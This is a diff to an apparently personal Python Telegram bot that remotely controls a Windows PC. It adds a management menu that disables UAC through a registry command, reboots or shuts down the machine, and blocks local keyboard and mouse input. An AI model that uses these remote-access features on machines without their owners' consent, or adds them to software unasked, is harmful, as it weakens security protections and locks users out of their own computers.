@@ -26,6 +26,7 @@ import psutil
 
 from pyautogui import *
 from telebot import *
+from ctypes import *
 from telebot import types
 from datetime import datetime
 
@@ -49,11 +50,12 @@ format_logs = data["format_logs"]
 users_ids = data["bot_users"]
 # ---------------------------------
 
-if write_logs:
+if write_logs:  
 	logging.basicConfig(level=logging.INFO, filename=file_logs,filemode=mode_logs, format=format_logs)
 
 rlgs = " "
 sysmode = 0
+inputblocked = False
 alertmode = 0
 writemode = 0
 alert = None
@@ -69,10 +71,11 @@ def start(message):
     item3 = types.KeyboardButton("⌨ Keyboard")
     item4 = types.KeyboardButton("🖱 Mouse")
     item5 = types.KeyboardButton("📺 Information")
-    item6 = types.KeyboardButton("📜 Logs")
-    item7 = types.KeyboardButton("⚙️ Settings")
+    item6 = types.KeyboardButton("🔧 Management")
+    item7 = types.KeyboardButton("📜 Logs")
+    item8 = types.KeyboardButton("⚙️ Settings")
     
-    markup.add(item1, item2, item3, item4, item5, item6, item7)
+    markup.add(item1, item2, item3, item4, item5, item6, item7, item8)
     bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
 @bot.message_handler(func=lambda message: message.text == "📸 Camera")
 def camera_shot(message):
@@ -122,6 +125,67 @@ def open_keyboard_menu(message):
     markup.add(item31, item32, item33, item34, item35,backb)
     bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
 
+@bot.message_handler(func=lambda message: message.text == "🔧 Management")
+def open_management_menu(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    item31 = types.KeyboardButton("🔧 Disable UAC (need to reboot)")
+    item32 = types.KeyboardButton("🔧 Reboot")
+    item33 = types.KeyboardButton("🔧 Shutdown")
+    item34 = types.KeyboardButton("🔧 Add in autorun")
+    item35 = types.KeyboardButton("🔧 Block input")
+    backb = types.KeyboardButton("◀ Back")
+    markup.add(item31, item32, item33, item34, item35,backb)
+    bot.send_message(message.chat.id, "📁 Management: Select option:", reply_markup=markup)
+
+@bot.message_handler(func=lambda message: message.text == "🔧 Disable UAC (need to reboot)")
+def disable_uac(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    os.system(r"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+    bot.send_message(message.chat.id, f"✅ Need to reboot.")
+
+@bot.message_handler(func=lambda message: message.text == "🔧 Reboot")
+def tg_reboot(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    os.system("shutdown /r /t 0")
+    bot.send_message(message.chat.id, f"✅ Success!")
+
+@bot.message_handler(func=lambda message: message.text == "🔧 Shutdown")
+def tg_shutdown(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    os.system("shutdown /s /t 0")
+    bot.send_message(message.chat.id, f"✅ Success!")
+
+@bot.message_handler(func=lambda message: message.text == "🔧 Block input")
+def block_input(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global inputblocked
+    global rlgs
+    if inputblocked:
+        inputblocked = False
+        ok = windll.user32.BlockInput(False) #disable block 
+        bot.send_message(message.chat.id, f"✅ Success!")
+    else:
+        inputblocked = True
+        ok = windll.user32.BlockInput(True) #enable block
+        bot.send_message(message.chat.id, f"✅ Success!")
+
+@bot.message_handler(func=lambda message: message.text == "🔧 Add in autorun")
+def add_autorun(message):
+    if not message.from_user.id in users_ids:
+        return None
+    global rlgs
+    bot.send_message(message.chat.id, f"🔧 Soon. Now you can manually add it to autostart.")
+
 @bot.message_handler(func=lambda message: message.text == "📺 Information")
 def open_info_menu(message):
     if not message.from_user.id in users_ids:
@@ -134,7 +198,7 @@ def open_info_menu(message):
     item34 = types.KeyboardButton("📀 CPU Information")
     backb = types.KeyboardButton("◀ Back")
     markup.add(item31, item32, item33, item34,backb)
-    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
+    bot.send_message(message.chat.id, "📁 Information: Select option:", reply_markup=markup)
 
 @bot.message_handler(func=lambda message: message.text == "🖥 Screen Resolution")
 def screen_res(message):
@@ -265,9 +329,9 @@ def open_logs(message):
         try:
             bot.send_message(message.chat.id, logf.readlines())
             if logf.readlines() == "":
-                bot.send_message(message.chat.id, "❌ Логи пустые")
+                bot.send_message(message.chat.id, "❌ No logs")
         except:
-            bot.send_message(message.chat.id, "❌ Неизвестная ошибка")
+            bot.send_message(message.chat.id, "❌ Unknown error")
 
 @bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
 def open_settings_menu(message):
@@ -278,7 +342,7 @@ def open_settings_menu(message):
     item63 = types.KeyboardButton("🌐 Language")
     backb = types.KeyboardButton("◀ Back")
     markup.add(item63,backb)
-    bot.send_message(message.chat.id, "📁 Keyboard: Select option:", reply_markup=markup)
+    bot.send_message(message.chat.id, "📁 Settings: Select option:", reply_markup=markup)
 
 @bot.message_handler(func=lambda message: message.text == "🌐 Language")
 def language_change(message):
